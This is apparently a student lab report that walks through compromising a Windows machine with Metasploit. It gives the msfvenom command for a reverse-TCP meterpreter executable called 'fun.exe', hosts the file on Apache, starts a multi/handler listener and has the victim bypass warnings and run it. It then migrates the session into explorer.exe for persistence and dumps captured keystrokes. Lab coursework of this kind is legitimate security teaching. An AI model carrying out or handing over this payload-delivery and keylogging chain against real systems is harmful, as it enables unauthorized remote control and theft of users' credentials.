# Compromising-windows-using-Metasploit

Compromising windows using Metasploit

# Metasploit

Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:

![image](https://github.com/22008686/Compromising-windows-using-Metasploit/assets/118916413/662e1113-220c-44d0-aa9f-1c83e254eb5e)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/22008686/Compromising-windows-using-Metasploit/assets/118916413/a894c9ec-aec4-42e4-ae58-931e69c77190)

copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/22008686/Compromising-windows-using-Metasploit/assets/118916413/2d40f577-88bf-4295-95e6-27bdbbcb9d06)

Start apache server sudo systemctl apache2 start

![image](https://github.com/22008686/Compromising-windows-using-Metasploit/assets/118916413/ae2a2d3d-d48c-40b0-896e-c8512f617487)

Check the status of apache2
![image](https://github.com/22008686/Compromising-windows-using-Metasploit/assets/118916413/474fad86-07e8-4bb9-84cd-1c87aca83d96)

Invoke msfconsole:

## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/22008686/Compromising-windows-using-Metasploit/assets/118916413/031a8ed0-0b12-4635-93cc-516c4d8bfe08)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/22008686/Compromising-windows-using-Metasploit/assets/118916413/b3dc4d12-c7fb-4601-ac8f-b61afd501987)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit
![image](https://github.com/22008686/Compromising-windows-using-Metasploit/assets/118916413/41162f9e-b75b-4956-b03e-c83fe535ead8)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156 

![image](https://github.com/22008686/Compromising-windows-using-Metasploit/assets/118916413/bfc7b80d-4ede-442c-b223-1fef21e57cc1)

The Metasploit shell is running inside the 
"fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/22008686/Compromising-windows-using-Metasploit/assets/118916413/3461a1c8-8dd9-406d-95e7-e225c73d9df5)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/22008686/Compromising-windows-using-Metasploit/assets/118916413/5f4557ea-be68-4a63-a578-4b14379dda22)

## RESULT:

The Metasploit framework is  used to compromise windows and is examined successfully.

